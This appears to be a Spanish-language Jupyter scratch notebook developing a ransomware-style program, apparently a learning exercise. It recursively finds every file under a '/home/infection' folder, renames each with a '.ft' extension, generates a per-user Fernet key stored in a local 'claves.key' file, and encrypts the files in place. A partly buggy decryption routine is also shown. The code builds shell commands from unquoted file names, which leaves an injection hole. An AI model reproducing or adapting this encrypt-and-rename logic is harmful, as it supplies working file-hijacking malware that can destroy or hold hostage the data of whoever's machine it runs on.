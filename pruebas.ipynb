{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 186,
   "metadata": {},
   "outputs": [],
   "source": [
    "import argparse\n",
    "import os\n",
    "from cryptography.fernet import Fernet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "ruta = \"/home/infection\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "def listar_archivos(ruta):\n",
    "    nombres = os.popen('ls ' + ruta).read()\n",
    "    nombres\n",
    "    archivos = nombres.strip('\\n').split('\\n')\n",
    "    return archivos"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['01', '1.ft', '2.ft', '3.ft', 'otra_cosa', 'prueba.ft']\n"
     ]
    }
   ],
   "source": [
    "archivos = listar_archivos(ruta)\n",
    "print (archivos)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [],
   "source": [
    "for elem in archivos:\n",
    "    if not elem.endswith('.ft'):\n",
    "       os.system(f\"mv {ruta}/{elem} {ruta}/{elem}.ft\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1.ft\n",
      "2.ft\n",
      "3.ft\n",
      "prueba.ft\n"
     ]
    }
   ],
   "source": [
    "\n",
    "os.system(f\"ls {ruta}\")\n",
    "for elem in archivos:\n",
    "    if elem.endswith('.ft'):\n",
    "       os.system(f\"mv {ruta}/{elem} {ruta}/{elem[:-3]}\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 192,
   "metadata": {},
   "outputs": [],
   "source": [
    "key = Fernet.generate_key()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "dicti_prueba = {'solo-1234' : b'1tlpI6d5qTBzW7NzmqwnYI22zmvqS8hhKQFL4Uo4QXI=', 'otro-1234' : 'es solo una prueba'}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 193,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'solo'"
      ]
     },
     "execution_count": 193,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "user = os.popen('whoami').read()[:-1]\n",
    "user"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'1tlpI6d5qTBzW7NzmqwnYI22zmvqS8hhKQFL4Uo4QXI='\n"
     ]
    }
   ],
   "source": [
    "if (user + '-1234') in dicti_prueba:\n",
    "    print (dicti_prueba[user + '-1234'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 194,
   "metadata": {},
   "outputs": [],
   "source": [
    "#def guardar_clave(user)\n",
    "with open (\"claves.key\", \"a\") as archivo_clave:\n",
    "    pass\n",
    "with open (\"claves.key\", \"r\") as archivo_clave:\n",
    "    if user in archivo_clave.read():\n",
    "        print ('el usuario ya existe')\n",
    "    else:\n",
    "        key = Fernet.generate_key()\n",
    "        with open (\"claves.key\", \"a\") as archivo_clave:\n",
    "            archivo_clave.write(user + ' : ' + str(key) + '\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 195,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'0PP335kBGQb2g6b1h7-sf0qJX7LRtIs27TCQNNdkUK0='\n",
      "<class 'bytes'>\n"
     ]
    }
   ],
   "source": [
    "def recuperar_key(user):\n",
    "    with open('claves.key', 'r') as key_file:\n",
    "        for linea in key_file:\n",
    "            if (user + ' :') in linea[:(len(user) + 2)]:\n",
    "                key = linea.split(':')[1].strip()[2:-1]\n",
    "                return key.encode()\n",
    "            else:\n",
    "                print (\"No hay usuarios con ese nombre registrados\")\n",
    "\n",
    "key = recuperar_key(user)\n",
    "print (key)\n",
    "print(type(key))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 196,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['1.ft', '2.ft', '3.ft']"
      ]
     },
     "execution_count": 196,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# prueba para ver si puedo hacerlo todo de una al principio\n",
    "\n",
    "def listar_archivos(ruta):\n",
    "    archivos = []\n",
    "    nombres = os.popen('ls ' + ruta).read()\n",
    "    nombres = nombres.strip('\\n').split('\\n')\n",
    "    for elem in nombres:\n",
    "        if not elem.endswith('.ft'):\n",
    "            os.system(f\"mv {ruta}/{elem} {ruta}/{elem.split('.')[0]}.ft\")\n",
    "            archivos.append(elem.split('.')[0] + '.ft')\n",
    "    return archivos\n",
    "\n",
    "archivos = listar_archivos(ruta)\n",
    "archivos"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 197,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ya hubo\n"
     ]
    }
   ],
   "source": [
    "with open('claves.key', 'r') as key_file:\n",
    "    for linea in key_file:\n",
    "        if (user + ' :') in linea[:(len(user) + 2)]:\n",
    "            print (\"Ya hubo\")\n",
    "        else:\n",
    "            print (\"No hay usuarios con ese nombre registrados\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 167,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "el usuario ya existe\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 167,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def guardar_clave(user):\n",
    "    with open (\"claves.key\", \"a\") as archivo_clave:\n",
    "        pass\n",
    "    with open (\"claves.key\", \"r\") as archivo_clave:\n",
    "        for linea in archivo_clave:\n",
    "            if (user + ' :') in linea[:(len(user) + 2)]:\n",
    "                print ('el usuario ya existe')\n",
    "                return 0\n",
    "                \n",
    "        key = Fernet.generate_key()\n",
    "        with open (\"claves.key\", \"a\") as archivo_clave:\n",
    "            archivo_clave.write(user + ' : ' + str(key) + '\\n')\n",
    "\n",
    "guardar_clave(user)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 198,
   "metadata": {},
   "outputs": [],
   "source": [
    "def codificar(lista, key):\n",
    "    for elem in lista:\n",
    "        with open ('/home/infection/'+elem, 'rb') as file:\n",
    "            mensaje = file.read()\n",
    "            f = Fernet(key)\n",
    "            encriptado = f.encrypt(mensaje)\n",
    "        with open ('/home/infection/'+elem, 'wb') as cryp:\n",
    "            cryp.write(encriptado)\n",
    "codificar (archivos, recuperar_key(user))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 199,
   "metadata": {},
   "outputs": [],
   "source": [
    "def decodificar(lista, key):\n",
    "    for elem in lista:\n",
    "        with open ('/home/infection/'+elem, 'rb') as file:\n",
    "            mensaje = file.read()\n",
    "            f = Fernet(key)\n",
    "            encriptado = f.decrypt(mensaje)\n",
    "        with open ('/home/infection/'+elem, 'w') as cryp:\n",
    "            cryp.write(encriptado)\n",
    "codificar (archivos, recuperar_key(user))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 222,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'gAAAAABi7A1MfvxLMien2t76vFxJ3Pl87RpPjcEqkWvdZA_hB9gFBnY_VwGZmfuNkj6xkraHdQgUa9vKtu9CIS9Tbuz_AaZuyQ=='"
      ]
     },
     "execution_count": 222,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "prueba = 'holas'.encode()\n",
    "v = Fernet(recuperar_key(user))\n",
    "v\n",
    "codificado = v.encrypt(prueba)\n",
    "codificado\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 224,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'holas'"
      ]
     },
     "execution_count": 224,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "v = Fernet(recuperar_key(user))\n",
    "des = v.decrypt(codificado).decode()\n",
    "des"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 242,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['prueba.ft', '1.ft', '2.ft', '3.ft', '01/22.odt', 'otra_cosa/45', 'otra_cosa/masaun/69.jeje']\n"
     ]
    }
   ],
   "source": [
    "prueba = os.popen('cd ' + ruta + ';find . -type f').read()\n",
    "ejemplo = prueba.strip('\\n').replace('./', '').split('\\n')\n",
    "print (ejemplo)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 244,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['/home/infection/prueba.ft', '/home/infection/1.ft', '/home/infection/2.ft', '/home/infection/3.ft', '/home/infection/01/22.odt', '/home/infection/otra_cosa/45', '/home/infection/otra_cosa/masaun/69.jeje']\n"
     ]
    }
   ],
   "source": [
    "prueba = os.popen('find '+ ruta +' -type f').read()\n",
    "ejemplo = prueba.strip('\\n').replace('./', '').split('\\n')\n",
    "print (ejemplo)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 246,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['/home/infection/01/22.ft', '/home/infection/otra_cosa/45.ft', '/home/infection/otra_cosa/masaun/69.ft']\n"
     ]
    }
   ],
   "source": [
    "def listar_archivos(ruta):\n",
    "    archivos = []\n",
    "    nombres = os.popen('find '+ ruta +' -type f').read()\n",
    "    nombres = nombres.strip('\\n').replace('./', '').split('\\n')\n",
    "    for elem in nombres:\n",
    "        if not elem.endswith('.ft'):\n",
    "            os.system(f\"mv {elem} {elem.split('.')[0]}.ft\")\n",
    "            archivos.append(elem.split('.')[0] + '.ft')\n",
    "    return archivos\n",
    "print (listar_archivos(ruta))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 261,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['/home/infection/01/22.odt.ft', '/home/infection/otra_cosa/masaun/69.jeje.ft', '/home/infection/otra_cosa/45.unknow.ft']\n"
     ]
    }
   ],
   "source": [
    "def listar_archivos(ruta):\n",
    "    \n",
    "    reverse = 0\n",
    "    archivos = []\n",
    "    nombres = os.popen('find '+ ruta +' -type f').read()\n",
    "    nombres = nombres.strip('\\n').replace('./', '').split('\\n')\n",
    "    for elem in nombres:\n",
    "        if reverse:\n",
    "            if elem.endswith('.ft') and (len(elem.split('.')) > 2):\n",
    "                if '.unknow' in elem:\n",
    "                    os.system(f\"mv {elem} {elem.split('.')[0]}\")\n",
    "                    archivos.append(elem.split('.')[0])\n",
    "                else:\n",
    "                    os.system(f\"mv {elem} {elem[:-3]}\")\n",
    "                    archivos.append(elem)\n",
    "        else:\n",
    "            if not elem.endswith('.ft'):\n",
    "                if '.' not in elem:\n",
    "                    os.system(f\"mv {elem} {elem}.unknow.ft\") # aqui no deberia sustituir sino anadir\n",
    "                    archivos.append(elem + '.unknow.ft')\n",
    "                else:\n",
    "                    os.system(f\"mv {elem} {elem}.ft\") # aqui no deberia sustituir sino anadir\n",
    "                    archivos.append(elem + '.ft')\n",
    "    return archivos\n",
    "\n",
    "print (listar_archivos(ruta))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Estamos analizando los archivos con los que trabajar.\n",
      "Estos son los archivos que hemos encontrado:\n",
      "01\n",
      "1.ft\n",
      "2.ft\n",
      "3.ft\n",
      "otra_cosa\n",
      "prueba.ft\n"
     ]
    }
   ],
   "source": [
    "print (f\"\"\"Estamos analizando los archivos con los que trabajar.\n",
    "Estos son los archivos que hemos encontrado:\"\"\")\n",
    "for elem in archivos: print (elem)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "try:\n",
    "    nombres = os.popen('find /home/solo/infection -type f 2> /dev/null').read()\n",
    "    nombres = nombres.strip('\\n').replace('./', '').split('\\n')\n",
    "except:\n",
    "    print (\"No esta saliendo todo bien\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.2 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "916dbcbb3f70747c44a77c7bcd40155683ae19c65e1c03b4aa3499c5328201f1"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
